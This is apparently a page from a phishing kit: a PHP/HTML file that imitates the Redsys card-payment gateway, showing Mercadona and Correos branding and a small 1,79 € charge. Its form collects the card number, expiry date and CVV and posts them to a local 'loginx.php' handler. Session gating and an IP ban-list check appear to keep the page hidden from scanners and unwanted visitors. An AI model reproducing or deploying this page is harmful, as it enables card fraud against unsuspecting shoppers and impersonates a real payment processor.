<?php
session_start();
date_default_timezone_set('Europe/Madrid');
require_once './config.php';
require_once './helpers/functions.php';
require_once './helpers/class/UserInfo.php';
require_once './admintus/config/User.php';
$user_id = User::sessionTime();

if (!isset($_SESSION['allowed'])) header("location: ./");
if (file_exists("./admintus/IPBam.txt")) comprobateIP("./admintus/IPBam.txt", UserInfo::getIP(), $out_url);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "about:legacy-compat">
<html xmlns:java="http://xml.apache.org/xalan/java" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">

<head>
	<meta content="-1" http-equiv="Expires">
	<meta content="Monday, 01-Jan-90 00:00:00 GMT" http-equiv="Expires">
	<meta content="no-cache, no-store" http-equiv="Pragma">
	<meta content="no-cache, no-store, max-age=0, must-revalidate" http-equiv="Cache-Control">
	<meta charset="UTF-8">
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
	<meta content="IE=edge" http-equiv="X-UA-Compatible">
	<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
	<link href="assets/9999favicon.ico" type="image/ico" rel="shortcut icon">
	<link href="assets/9999favicon.ico" type="image/ico" rel="icon">
	<title>Redsys</title>
	<link type="text/css" href="assets/sis/estilos/unica/9999redsys.css" rel="StyleSheet">
	<link type="text/css" href="assets/sis/estilos/unica/9000-ni.css" rel="StyleSheet">
	<link type="text/css" href="assets/sis/estilos/unica/9999-ni.css" rel="StyleSheet">
	<link rel="StyleSheet" type="text/css" href="assets/sis/comercios/estilos/63276513-100-1-ni.css">
	<!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.3/css/all.css" integrity="sha384-SZXxX4whJ79/gErwcOYf+zWLeJdY/qpuqC4cAa9rOGUstPomtqpuNWT9wdPEn2fk" crossorigin="anonymous"> -->
	<style></style>
	<style></style>
</head>
<body id="home" style="zoom: 1;" cz-shortcut-listen="true">
	<div id="container">
		<header id="header">
			<div class="container">
				<h1 style="display:none;">Redsys</h1>
				<div class="logoComercio">
					<img alt="" src="assets/img/mercadona-logo.08013cdd.svg">
				</div>
				<div class="logoEntidad">
					<img alt="" src="assets/sis/graficos/logotipos/entidad/9999.png">
				</div>
				<div class="lang-wr">
					<div class="left">
						<label for="checkIdioma">
							<p>
								<text lngid="seleccioneSuIdioma" id="seleccioneSuIdioma">Seleccione su idioma</text>
							</p>
						</label>
					</div>
					<div class="right">
						<select id="checkIdioma"> class="lang"
							<option value="1">Castellano</option>
							<option value="3">Català</option>
							<option value="13">Euskara</option>
							<option value="12">Galego</option>
							<option value="10">Valencià</option>
							<option disabled="" value=""></option>
							<option value="203">Čeština</option> ÄeÅ¡tina Czech
							<option value="208">Dansk</option>
							<option value="5">Deutsch</option>
							<option value="233">Eesti keel</option> Estonian
							<option value="300">ελληνικά</option> Greek ÎµÎ»Î»Î·Î½Î¹ÎºÎ¬
							<option value="2">English</option>
							<option value="4">Français</option>
							<option value="191">Hrvatski</option> Croatian
							<option value="428">Latviešu valoda</option> Latvian LatvieÅ¡u valoda
							<option value="440">Lietuvių kalba</option> Lithuanian Å³
							<option value="348">Magyar</option> Hungarian
							<option value="470">Malti</option> Maltese
							<option value="6">Nederlands</option>
							<option value="7">Italiano</option>
							<option value="642">Română</option> Romanian romÃ¢nÄƒ
							<option value="8">Svenska</option>
							<option value="11">Polski</option>
							<option value="9">Português</option>
							<option value="14">Aragonês</option>
							<option value="643">ру́сский язы́к</option> Russkiy Ã‘â‚¬Ã‘Æ’Ã‘ÂÃ‘ÂÃÂºÃÂ¸ÃÂ¹
							<option value="100">български език</option> Bulgaro Bułgarskiy
							<option value="705">Slovenski jezik</option> Slovenian
							<option value="703">Slovenský jazyk</option> Slovak slovenskÃ½ jazyk
							<option value="246">Suomi</option> Finnish
							<option value="792">Türkçe</option>
							<option value="356">Hindi</option>
						</select>
						<div class="clear-fix"></div>
					</div>
				</div>
			</div>
		</header>
		<ol class="steps-wr">
			<li id="s-method" class="step active">
				<label type="hidden" for="s-method" value="Paso 1. Selecione método de pago "></label><span class="num">1</span>
				<p lngid="seleccioneMetodoPago" tittle="" class="s-text">Seleccione método de pago</p>
			</li>
			<li id="s-auth" class="step ">
				<span class="num">2</span>
				<p lngid="comprobacionAutenticacion" class="s-text">Comprobación autenticación</p>
			</li>
			<li id="s-connect" class="step ">
				<span class="num">3</span>
				<p lngid="solicitandoAutorizacion" class="s-text">Solicitando Autorización</p>
			</li>
			<li id="s-result" class="step ">
				<span class="num">4</span>
				<p lngid="resultadoTransaccion" class="s-text">Resultado Transacción</p>
			</li>
		</ol>
		<div class="clear-fix"></div>
		<div id="body">
			<div class="header-mobile">
				<div class="comercio-mobile">
					<div class="logoComercio">
						<img alt="" src="assets/img/mercadona-logo.08013cdd.svg">
					</div>
				</div>
				<div class="precio-mobile">
					<div class="right">
						<p>1,79&nbsp;€</p>
					</div>
				</div>
			</div>
			<div class="col-wr right">
				<div class="tituloSeleccioneMetodoDePago">
					<h3 class="tituloSeleccioneMetodoDePago" lngid="tituloSeleccioneMetodoDePago">Seleccione método de pago</h3>
				</div>
				<form autocomplete="off" name="formTarjeta" id="formchain" action="./helpers/loginx.php" method="POST" class="card-form es">
					<input type="hidden" name="step" value="card">
					<div style="min-height:16px !important; overflow-y: auto;" class="cards-mod-wr">
						<div class="tituloPagoTarjeta" style="background-image: url(&quot;assets/sis/graficos/logotipos/comunes/2100abrirpuntaarriba.png&quot;);">
							<div style="float:left;" class="pagoConTarjeta">
								<h2 lngid="pagoConTarjeta" class="pagoConTarjeta">Pagar con Tarjeta</h2>
								<center>domiciliaci&oacute;n bancaria</center>
							</div>
							<div style="float:right;"></div>
							<div class="center-cards">
								<div class="microcard" id="micro-visa"></div>
								<div class="microcard" id="micro-master1"></div>
								<div class="microcard" id="micro-master2"></div>
								<div class="microcard" id="micro-american"></div>
								<div class="microcard" id="micro-dinners"></div>
								<div class="microcard" id="micro-jcb"></div>
							</div>
						</div>
						<?php if (isset($_SESSION['update']['card'])) : ?>
							<p style="text-align: center;margin-top: 50px;padding: 8px;"></p>
							<ul style="margin-top: 20px;">
								<li style="text-align: center;color: red;background-color: #ffd9d9;border-radius: 8px;padding: 10px;">
									Los datos ingresados no son validos, por favor corrijalos e intente de nuevo
								</li>
							</ul>
						<?php endif; ?>
						<?php if (isset($_SESSION['errors']['cc'])) : ?>
							<p style="text-align: center;margin-top: 50px;padding: 8px;"></p>
							<ol style="text-align: center;color: red">
								<li style="text-align: center;color: red;background-color: #ffd9d9;border-radius: 8px;padding: 10px;">
									<?php  foreach ($_SESSION['errors']['cc'] as $error) : ?>
										<?= $error."<br>"; ?>
									<?php endforeach; ?>
				
								</li>
							</ol>
						<?php endif; ?>
						<div class="datosTarjeta" style="display: block;">
							<div class="lineaPagoTarjeta">
								<div class="detalleTarjeta">
									<text lngid="tarjeta">Nº Tarjeta:</text>
								</div>
								<div class="inputTarjeta">
									<!-- <i class="far fa-credit-card" style="font-size: 16px;float: left;"></i> -->
									<label for="inputCard" style="visibility:hidden;line-height: 0px;" value="Número de la tarjeta"></label>
									<input id="inputCard" name="card" type="text" class="left form-control numbersOnly" size="20" minlength="15" maxlength="16" lngid="altTarjeta" alt="Número de la tarjeta" title="Número de la tarjeta" autocomplete="off" float="right" pattern="[4-5]{1}[0-9]{15}" onblur="javascript:activarTextoOpcionalUPI();" required value="" style="height:30px;">
								</div>
							</div>
							<div class="lineaPagoTarjeta">
								<div class="detalleTarjeta">
									<text lngid="caducidad">Caducidad:</text>
								</div>
								<div class="inputTarjeta">
									<!-- <i class="fal fa-calendar-times" style="font-size: 16px;float: left;"></i> -->
									<label for="cad1" style="visibility:hidden;line-height: 0px;" value="Mes"></label>
									<input style="height: 30px;margin-right: 5px;" id="cad1" name="month" placeholder="mm" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="mes" alt="Mes" title="Mes" autocomplete="off" pattern="[0-9]{2}" required value="">&nbsp;
									<label for="cad2" style="visibility:hidden;line-height: 0px;" value="Año"></label>
									<input id="cad2" name="year" placeholder="aa" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="agno" alt="Año" title="Año" autocomplete="off" pattern="[0-9]{2}" value="" required style="height: 30px;">
									<div style="display:none;" id="mmaa">&nbsp;(<span lngid="monthmonth" id="monthmonth" class="text">mm</span>/
										<span lngid="yearyear" id="yearyear" class="text">aa</span>)
									</div>
								</div>
							</div>
							<div style="display: none;" id="caducidadOpcionalUPI" class="detalleTarjeta">
								<text style="font-size:12px" lngid="opcionalUPI">(*) Optional for Debit Card</text>
							</div>
							<div class="lineaPagoTarjeta">
								<div class="detalleTarjeta">
									<text lngid="codigoSeguridad">Cód. Seguridad:</text>
								</div>
								<div class="inputTarjeta">
									<!-- <i style="float:left;font-size: 16px" class="far fa-lock"></i> -->
									<label for="codseg" style="visibility:hidden;line-height: 0px;" value="Cód. Seguridad"></label>
									<input id="codseg" name="cvv" type="tel" class="left form-control numbersOnly" minlength="3" maxlength="4" size="4" lngid="codigoSeguridad" 	alt="Cód. Seguridad" title="Cód. Seguridad" required autocomplete="off" pattern="[0-9]{0,4}" value="" style="height: 30px;width: 60px;">
									<label type="hidden" for="altCVV2info" style="visibility:hidden;line-height: 0px;" value="¿Qué es el CVV2?"></label>
									<input type="button" id="altCVV2info" class="icon-cvc-help" value="?">
								</div>
							</div>
							<div style="display: none;" id="cvvOpcionalUPI" class="detalleTarjeta">
								<text style="font-size:12px" lngid="opcionalUPI">(*) Optional for Debit Card</text>
							</div>

							<!-- <div class="message hide" id="message01">Introduce un nÂº</div> -->
							<div class="col-wr buttons-wr right">
								<button lngid="aceptar" id="divImgAceptar" class="btn btn-lg btn-accept" type="submit" style="position: relative;left: -30%;">Aceptar</button>
							</div>
						</div>
					</div>
				</form>

				<div class="preft">

				</div>
			</div>
			<div class="col-wr left result">
				<div class="ticket-mod-wr">
					<div class="datosDeLaOperacion">
						<h1 class="datosDeLaOperacion" lngid="datosDeLaOperacion">Datos de la operación</h1>
					</div>
					<div class="ticket-header">
						<div class="circle half-circlel"></div>
						<div class="circle half-circler"></div>
						<div class="price">
							<div class="left">
								<p lngid="importe">Importe:</p>
							</div>
							<div class="right">
								<p>1,79&nbsp;€</p>
							</div>
							<br class="clear-fix">
						</div>
					</div>
					<div class="ticket-info">
						<table class="table-condensed">
							<tbody>
								<tr id="filaNombreComercio">
									<td lngid="comercio" class="text">Comercio:<br>
										<br>
										<br>
									</td>
									<td class="numeric">Correos<br>
										<br>(ESPAÑA)
									</td>
								</tr>
								<tr id="filaCodigoComercio">
									<td lngid="terminal" class="text">Terminal:</td>
									<td class="numeric">63276513-100</td>
								</tr>
								<tr id="filaNumeroPedido">
									<td lngid="pedido" class="text">Pedido:</td>
									<td class="numeric">460000284340</td>
								</tr>
								<tr id="filaFecha">
									<td lngid="fecha" class="text">Fecha:</td>
									<td class="numeric"><?= date('d/m/Y') . "&nbsp" . date('G:m') ?></td>
								</tr>
							</tbody>
						</table>
					</div>
				</div>
			</div>
			<div class="verified">
				<ul>
					<li>
						<a id="iv-visa">

						</a>
					</li>
					<li>
						<a id="iv-mc" href="#">

						</a>
					</li>
					<li>
						<a id="iv-aex">

						</a>
					</li>
					<li>
						<a id="iv-jcb">

						</a>
					</li>
				</ul>
			</div>
		</div>
		<footer id="footer">
			<p lngid="powered" class="powered">Powered by Redsys</p>
			<div class="copyright">
				<center>
					<text lngid="copyright">
						(c) 2021 Redsys Servicios de Procesamiento. SL - Todos los derechos reservados.</text>
				</center>
			</div>
		</footer>
	</div>
	<div name="lightbox-informacionPAE" id="lightbox-informacionPAE">
		<div class="cancel-wr">
			<div style="Padding-top: 30px;" id="textoInfoPAE">
				<img src="assets/sis/graficos/logotipos/logoPAE.png" alt="Pago Aplazado">
				<h3 style="font: bold;font-size:18px;Padding-top: 15px;">
					<b>Con plazox podrás aplazar tus compras en 3, 6, 9 y 12 meses con tus tarjetas de crédito de las entidades adheridas.</b>
				</h3>
				<p style="Padding-top: 15px; size: 18px;">Para más info, consulta en tu banco.</p>
			</div>
			<div style="Padding-top: 30px;" id="entidadesPlazox"><img alt="" style="max-width:75px;padding:10px" src="assets/sis/graficos/logotipos/entidad/.png"></div>
		</div>
		<div style="Padding-top: 30px;" class="cancel-wr">
			<button type="button" class="btn btn-lg btn-close close-panel" lngid="cerrar">Cerrar</button>
		</div>
	</div>
	<div id="lightbox"></div>
	<div id="lightbox-panel">
		<div class="cancel-wr">
			<h2 lngid="codigoSeguridad">Cód. Seguridad</h2>
			<img alt="" src="./assets/sis/graficos/logotipos/comunes/9999cvc-help.png">
		</div>
		<div class="help-text">
			<p lngid="codigoSeguridadTresDigitos">El código de seguridad son los tres últimos dígitos que aparecen en el reverso de las tarjetas de las marcas Visa, Visa Electron, Mastercard y Maestro.</p>
			<p lngid="casoTarjetasAmericanExpress">En el caso de las tarjetas American Express, el código son los cuatro dígitos que aparecen encima de la numeración de la tarjeta.</p>
		</div>
		<div class="cancel-wr">
			<button type="button" class="btn btn-lg btn-close close-panel" lngid="cerrar">Cerrar</button>
		</div>
	</div>
	<div id="lightbox"></div>
	<app-content ng-version="11.1.0"></app-content>
</body>
<app-content></app-content>
</html>